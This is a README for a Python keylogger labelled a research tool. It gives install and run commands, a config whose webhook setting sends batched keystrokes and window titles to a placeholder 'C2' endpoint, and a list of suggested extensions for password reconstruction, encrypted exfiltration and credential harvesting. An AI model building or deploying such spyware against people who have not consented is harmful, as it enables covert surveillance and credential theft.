# Keylogger — Cybersecurity Research Tool

> **Ethical use only.** Run exclusively on systems you own or have explicit written permission to test.  
> Unauthorised deployment is illegal in most jurisdictions (CFAA, Computer Misuse Act, etc.).

---

## Features

| Feature | Detail |
|---|---|
| Timestamp precision | Microsecond UTC via `time.time()` + ISO-8601 |
| Active window tracking | Windows (WinAPI), macOS (AppKit), Linux (xdotool) |
| Log rotation | Default 5 MB per file, configurable |
| Runtime toggle | **F9** pauses / resumes capture without restart |
| Webhook delivery | Batched HTTP POST simulation for C2 research |
| Output format | JSON-Lines (`.jsonl`) — one event per line |
| Thread safety | Writer thread + `threading.Lock` + `Queue` |

---

## Install

```bash
pip install pynput requests psutil
# Linux only (active window tracking):
sudo apt install xdotool
```

---

## Run

```bash
python keylogger.py
```

Logs are written to `logs/keylog_<timestamp>_<index>.jsonl`.

---

## Configuration

Edit the `CONFIG` dict at the top of `keylogger.py`:

```python
CONFIG = {
    "log_dir":        Path("logs"),
    "log_basename":   "keylog",
    "max_log_size":   5 * 1024 * 1024,   # bytes — 5 MB default
    "flush_interval": 2.0,               # seconds between flushes
    "webhook_url":    None,              # set to your endpoint for C2 sim
    "webhook_batch":  20,                # events per POST
    "toggle_key":     keyboard.Key.f9,   # change hotkey here
}
```

### Webhook / C2 simulation

Set `webhook_url` to any HTTP endpoint (e.g. a local Flask server or requestbin):

```python
"webhook_url": "https://your-server.local/ingest"
```

Events are batched (`webhook_batch`) and sent as JSON:

```json
{
  "source": "DESKTOP-ABC123",
  "events": [
    { "ts": "2026-06-07T10:23:11.123456Z", "type": "press", "key": "h", "window": "VS Code", "host": "...", "os": "Windows" },
    ...
  ]
}
```

---

## Log format (JSONL)

Each line is one key event:

```json
{
  "ts":     "2026-06-07T10:23:11.123456Z",
  "ts_us":  1749291791.123456,
  "type":   "press",
  "key":    "a",
  "window": "Firefox — Google",
  "host":   "DESKTOP-ABC123",
  "os":     "Windows"
}
```

Special keys are wrapped: `[shift]`, `[ctrl]`, `[enter]`, etc.

---

## Controls

| Key | Action |
|---|---|
| **F9** | Toggle pause / resume |
| **Ctrl-C** | Graceful shutdown + flush |

---

## Research extensions (ideas)

- Parse JSONL logs to reconstruct typed text / passwords (session replay)
- Add AES encryption of log files before exfil (crypto exercise)
- Replace webhook with a raw TCP socket for lower-level C2 simulation
- Add screenshot capture on configurable interval (add `Pillow`)
- Correlate window titles with keystrokes for credential harvesting analysis

---

## Dependencies

| Package | Purpose |
|---|---|
| `pynput` | Cross-platform keyboard hook |
| `requests` | Webhook HTTP delivery |
| `psutil` | (Optional) process metadata |
| `xdotool` | Linux active window (system pkg) |